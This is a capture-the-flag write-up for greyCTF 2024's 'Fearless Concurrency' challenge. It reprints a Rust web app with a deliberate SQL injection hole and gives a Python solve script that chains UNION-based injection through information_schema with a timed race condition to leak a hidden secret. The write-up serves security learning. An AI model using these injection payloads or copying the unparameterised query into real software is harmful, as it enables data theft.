---
title: Fearless Concurrency
date: 2024-04-22
tags: 
- web
- race condition
- sqli
- author-hartmannsyg
categories: greyCTF 2024
---

solved by {% person hartmannsyg %}

>Rust is the most safest, fastest and bestest language to write web app! The code compiles, therefore it is impossible for bugs! PS: This is my first rust project (real) 🦀🦀🦀🦀🦀
>Author: jro
>http://challs.nusgreyhats.org:33333

<details>
<summary>Full source code</summary>
```rs
use std::{collections::HashMap, sync::Arc};

use mysql_async::{prelude::Queryable, Pool};
use axum::{
    extract::State, response::IntoResponse, routing::{get, post}, Json, Router
};
use serde::Deserialize;
use sha1::{Digest, Sha1};
use tokio::sync::{Mutex, RwLock};

#[derive(Clone)]
struct User {
    lock: Arc<Mutex<()>>,
    secret: u32
}

impl User {
    fn new() -> User {
        User {
            lock: Arc::new(Mutex::new(())),
            secret: rand::random::<u32>()
        }
    }
}

#[derive(Clone)]
struct AppState {
    users: Arc<RwLock<HashMap<u64, User>>>,
    pool: Arc<Pool>
}

impl AppState {
    fn new(pool: Pool) -> AppState {
        AppState { 
            users: Arc::new(RwLock::new(HashMap::new())),
            pool: Arc::new(pool)
        }
    }
}

#[tokio::main]
async fn main() {
    tracing_subscriber::fmt::init();

    let url = "mysql://fearless_concurrency:fearless_concurrency@database:3306/fearless_concurrency";

    let pool = Pool::new(url);

    let mut conn = pool.get_conn().await.unwrap();
    conn.exec_drop("CREATE TABLE IF NOT EXISTS info (body varchar(255))", ()).await.unwrap();
    conn.exec_drop("INSERT INTO info VALUES ('Hello, world')", ()).await.unwrap();

    let state = AppState::new(pool);
    let app = Router::new()
        .route("/", get(root))
        .route("/register", post(register))
        .route("/query", post(query))
        .route("/flag", post(flag))
        .with_state(state);

    let listener = tokio::net::TcpListener::bind("0.0.0.0:3000").await.unwrap();
    println!("Listener started on port 3000");
    axum::serve(listener, app).await.unwrap();
}

async fn root() -> &'static str {
    "Hello, World!"
}

async fn register(State(state): State<AppState>) -> impl IntoResponse {
    let uid = rand::random::<u64>();
    let mut users = state.users.write().await;
    let user = User::new();
    users.insert(uid, user);
    uid.to_string()
}

#[derive(Deserialize)]
struct Query {
    user_id: u64,
    query_string: String
}

async fn query(State(state): State<AppState>, Json(body): Json<Query>) -> axum::response::Result<String> {
    let users = state.users.read().await;
    let user = users.get(&body.user_id).ok_or_else(|| "User not found! Register first!")?;
    let user = user.clone();

    // Prevent registrations from being blocked while query is running
    // Fearless concurrency :tm:
    drop(users);

    // Prevent concurrent access to the database!
    // Don't even try any race condition thingies
    // They don't exist in rust!
    let _lock = user.lock.lock().await;
    let mut conn = state.pool.get_conn().await.map_err(|_| "Failed to acquire connection")?;

    // Unguessable table name (requires knowledge of user id and random table id)
    let table_id = rand::random::<u32>();
    let mut hasher = Sha1::new();
    hasher.update(b"fearless_concurrency");
    hasher.update(body.user_id.to_le_bytes());
    let table_name = format!("tbl_{}_{}", hex::encode(hasher.finalize()), table_id);

    let table_name = dbg!(table_name);
    let qs = dbg!(body.query_string);

    // Create temporary, unguessable table to store user secret
    conn.exec_drop(
        format!("CREATE TABLE {} (secret int unsigned)", table_name), ()
    ).await.map_err(|_| "Failed to create table")?;

    conn.exec_drop(
        format!("INSERT INTO {} values ({})", table_name, user.secret), ()
    ).await.map_err(|_| "Failed to insert secret")?;


    // Secret can't be leaked here since table name is unguessable!
    let res = conn.exec_first::<String, _, _>(
        format!("SELECT * FROM info WHERE body LIKE '{}'", qs),
        ()
    ).await;

    // You'll never get the secret!
    conn.exec_drop(
        format!("DROP TABLE {}", table_name), ()
    ).await.map_err(|_| "Failed to drop table")?;

    let res = res.map_err(|_| "Failed to run query")?;

    // _lock is automatically dropped when function exits, releasing the user lock

    if let Some(result) = res {
        return Ok(result);
    }
    Ok(String::from("No results!"))
}


#[derive(Deserialize)]
struct ClaimFlag {
    user_id: u64,
    secret: u32
}

async fn flag(State(state): State<AppState>, Json(body): Json<ClaimFlag>)  -> axum::response::Result<String> {
    let users = state.users.read().await;
    let user = users.get(&body.user_id).ok_or_else(|| "User not found! Register first!")?;

    if user.secret == body.secret {
        return Ok(String::from("grey{fake_flag_for_testing}"));
    }
    Ok(String::from("Wrong!"))
}
```
</details>

There are a few endpoints we can use:
1. `/register`
    this adds a random `user_id` to their hashmap `users`
    {% ccb gutter1:26-30 lang:rs %}
    #[derive(Clone)]
    struct AppState {
        users: Arc<RwLock<HashMap<u64, User>>>,
        pool: Arc<Pool>
    }
    {% endccb %}
    {% ccb gutter1:70-76 lang:rs %}
    async fn register(State(state): State<AppState>) -> impl IntoResponse {
        let uid = rand::random::<u64>();
        let mut users = state.users.write().await;
        let user = User::new();
        users.insert(uid, user);
        uid.to_string()
    }
    {% endccb %}

2. `/query`
    You give it your `user_id` and a `query_string` and it does quite a few things:
    - locks the `user` based on the `user_id` provided (so you can't race condition with the same `user_id`)
        {% ccb gutter1:93-96 lang:rs %}
        // Prevent concurrent access to the database!
        // Don't even try any race condition thingies
        // They don't exist in rust!
        let _lock = user.lock.lock().await;
        {% endccb %}
    - Creates an "Unguessable table name", which contains `sha1(user_id)` and a randoom number:
        {% ccb gutter1:99-104 lang:rs %}
        // Unguessable table name (requires knowledge of user id and random table id)
        let table_id = rand::random::<u32>();
        let mut hasher = Sha1::new();
        hasher.update(b"fearless_concurrency");
        hasher.update(body.user_id.to_le_bytes());
        let table_name = format!("tbl_{}_{}", hex::encode(hasher.finalize()), table_id);
        {% endccb %}
    - Creates a new table and stores the user secret inside:
        {% ccb gutter1:109-116 lang:rs %}
        // Create temporary, unguessable table to store user secret
        conn.exec_drop(
            format!("CREATE TABLE {} (secret int unsigned)", table_name), ()
        ).await.map_err(|_| "Failed to create table")?;

        conn.exec_drop(
            format!("INSERT INTO {} values ({})", table_name, user.secret), ()
        ).await.map_err(|_| "Failed to insert secret")?;
        {% endccb %}
    - It then queries your query from `info`, which only contains `Hello, World!`. Note that it is vulnerable to SQL injection:
        {% ccb gutter1:119-123 lang:rs highlight:3 %}
        // Secret can't be leaked here since table name is unguessable!
        let res = conn.exec_first::<String, _, _>(
            format!("SELECT * FROM info WHERE body LIKE '{}'", qs),
            ()
        ).await;
        {% endccb %}

    - It then deletes the unguessable table:
        {% ccb gutter1:125-128 lang:rs %}
        // You'll never get the secret!
        conn.exec_drop(
            format!("DROP TABLE {}", table_name), ()
        ).await.map_err(|_| "Failed to drop table")?;
        {% endccb %}

## My initial thoughtss

Well obviously we have SQL injection, so we can use `'UNION SELECT ...` to get other data we want

My inital idea was trying to get the table name from `select table_name from information_schema.tables where table_name LIKE '...'`, then using that result to create a select statement. Potentially something like:

{% ccb lang:sql wrapped:true %}
select * from magically_turn_into_the_table(select table_name from information_schema.tables where table_name LIKE '...')
{% endccb %}

> Spoiler alert: It didn't work<br>
> Apparently doing something like that requires *dynamic SQL* or something, and is not feasible within normal SQL

I then kinda tried naively playing around with race conditions unsuccessfully; thankfully I managed to find *a* solution:

## My (potentially overcomplicated) solution


![](../../static/greyCTF2024/fearless_concurrency.png)

<details>
<summary>My solve script</summary>
```py
import asyncio
import httpx
import hashlib
import struct

async def func1(client, uid1, uid2, shah):
    resp = await client.post(f'http://challs.nusgreyhats.org:33333/query', json={"user_id": uid1, "query_string":f"'union select table_name from information_schema.tables where table_name LIKE 'tbl_{shah}%';#"})
    table_name = resp.text
    resp = await client.post(f'http://challs.nusgreyhats.org:33333/query', json={"user_id": uid2, "query_string":f"'union select * from {table_name};#"})
    return resp.text

async def func2(client, uid2):
    # time consuming query?
    q = f"'union select i.table_name from information_schema.tables,information_schema.tables as i;#"
    resp = await client.post(f'http://challs.nusgreyhats.org:33333/query', json={"user_id": uid2, "query_string":q})
    return resp.text

async def main():
    async with httpx.AsyncClient() as client:
        
        register1 = await client.post('http://challs.nusgreyhats.org:33333/register')
        uid1 = int(register1.text)
        
        register2 = await client.post('http://challs.nusgreyhats.org:33333/register')
        uid2 = int(register2.text)
        
        tasks = []

        hasher = hashlib.sha1()
        hasher.update(b"fearless_concurrency")
        user_id_bytes = struct.pack("<Q", uid2) # equivalent to p64
        hasher.update(user_id_bytes)
        shah = hasher.hexdigest()

        print(f"uid1 = {uid1}, uid2 = {uid2}")

        # swapping func2 and func1 operations worked for me so the numbering is fucked
        tasks.append(asyncio.ensure_future(func2(client, uid2)))
        tasks.append(asyncio.ensure_future(func1(client, uid1, uid2, shah)))
        
        # Get responses
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Print results
        print(f'func2: {results[0]}')
        print(f'func1: {results[1]}')
        
        if len(results[1]) > 0 and results[1].isdigit():
            flag = await client.post('http://challs.nusgreyhats.org:33333/flag', json={"user_id":uid2, "secret":int(results[1])})
            print(flag.text)

asyncio.run(main())
```
</details>

In my case, I used a time-consuming cartesian product:

{% ccb lang:sql wrapped:true %}
SELECT * FROM info WHERE body LIKE ''union select i.table_name from information_schema.tables,information_schema.tables as i;#'
{% endccb %}

since for some reason there were tons and tons of undropped tables in the database, even doing a cartesian product of `information_schema.tables,information_schema.tables` is more than enough to lag it enough. (When I added even more `information_schema.tables` to the cartesian product I get an error message lol)

As it turned out, more normal and sane people would have use `SLEEP`, truly a bruh moment.

## Other solutions/ideas

- Leaking out the table name one character at a time (this uses more requests though)
- somehow using sqlmap to get the flag (idk how that worked)